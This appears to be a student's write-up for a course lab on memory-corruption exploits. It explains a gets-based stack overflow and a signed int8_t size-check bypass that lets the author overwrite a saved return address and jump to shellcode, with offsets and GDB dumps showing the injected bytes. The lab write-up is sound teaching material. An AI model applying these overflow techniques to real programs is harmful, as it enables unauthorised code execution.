# Write-Up


## Remus
### Main Idea
I utilized a `gets` vulnerability in order to continue writing into the stack past designated buffer. This allowed me to write into the location of memroy where the `rip` was stored. I then wrote the `SHELLCODE` into the address right after the `rip`, and then overwrote `rip` to point to the address of the `SHELLCODE`. This is because once the function returns, it will automatically move set the `eip` to `rip` and resume running the program. We can take advatange of this and make `eip` run our `SHELLCODE` instead of returning and continuing the program.


## Spica
### Main Idea
After looking at the `telemetry.c` code closely, I realized that I could utilize a integer type vulnerability that was taught in lecture. The spec mentions there is a piece of code that checks to make sure that the file read must have a byte size limit. The lines of code I spotted in `telemetry.c`:
```
if (bytes_read == 0 || size > 128) {
    return;
}
```
This check immediately made me think of the example given in lecture, where the attack was based upon the fact that the `size` variable was poorly initialized as an `int` instead of a `size_t`. Since the `int` type was signed, the attack would take advantage of two's complement representing a large unsigned number as a negative number, therefore bypassing the `size > 128` check. Lo and behold, in line 7: `int8_t size;`.
### Testing
I had to check one more thing. I went online to look at the C man pages for the `fread` function signature, and confirmed that its `arg2` was the type `size_t`. This would enable me to set `size` to be `0xff`, which is the largest possible number for the unsigned 8 bit integer, but actually just `-1` in the signed world of `int8_t`.
### Exploit Process
The first `fread` would happily write `0xff` into `size`, which would then pass the `if` check due to it comparing `int8_t` type against `128`. Then after that, the second `fread` function call will treat `size` like a `size_t` (unsigned int), and now I can write past where I am not supposed to. After gaining access to the area in memory outside of the file limit, all I needed to do was find where the return address was stored, which would inevitably be executed once the function returned.
### Magic Numbers
Using GDB, I found the address of the `rip` and subtracted it from the address of the beginning of `msg`. The address of `rip` was `148` bytes away from the start of `msg`, so I filled in garbage for `148` bytes till the location of `rip`, then overwrote `rip` to be another address just `4` bytes ahead, and then placed the `SHELLCODE` right there, and boom. Exploited.
### GDB
##### `info frame` output:
```
(gdb) i f
Stack level 0, frame at 0xffffd700:
 eip = 0x8049276 in display (telemetry.c:24); saved eip = 0xffffd700
 called by frame at 0x41414149
 source language c.
 Arglist at 0xffffd6f8, args: path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>
 Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
 Saved registers:
  ebp at 0xffffd6f8, eip at 0xffffd6fc
(gdb) 
```
`rip` is at `0xffffd6fc`.

#### Before exploit:
```
(gdb) b 18
Breakpoint 2 at 0x8049235: file telemetry.c, line 18.
(gdb) r
Starting program: /home/spica/telemetry navigation

Breakpoint 2, display (path=0xffffd8bb "navigation") at telemetry.c:18
18          bytes_read = fread(&size, 1, 1, file);
(gdb) x/44x msg  
0xffffd668:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd678:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd688:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd698:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6a8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6c8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6e8:     0x00000000      0x0804e000      0x00000000      0xffffdfe2
0xffffd6f8:     0xffffd718     >0x080492bd<     0xffffd8bb      0x00000000
0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffd730
(gdb) 
```
Breakpoint is placed before first fread.\
`rip` is labeled with surrounding `> <`.

#### After exploit:
```
(gdb) c
Continuing.

Breakpoint 1, display (path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>) at telemetr
y.c:24
24          puts(msg);
(gdb) x/44x msg
0xffffd668:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd678:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd688:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd698:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e8:     0x000000d2      0x41414141      0x41414141      0x41414141
0xffffd6f8:     0x41414141     >0xffffd700<     0xcd58326a      0x89c38980
0xffffd708:     0x58476ac1      0xc03180cd      0x692d6850      0xe2896969
```
`msg` is overwritten with A's (`41` in hexadecimal ASCII), and continues overwriting all the way to `rip` (labaled with `> <`)
The `rip` is overwritten with an address which is just `4` bytes in front, and at that address you can see the `SHELLCODE`, which looks very different than in the **Before** GDB dump.


## Polaris
### Main Idea
i hate this problem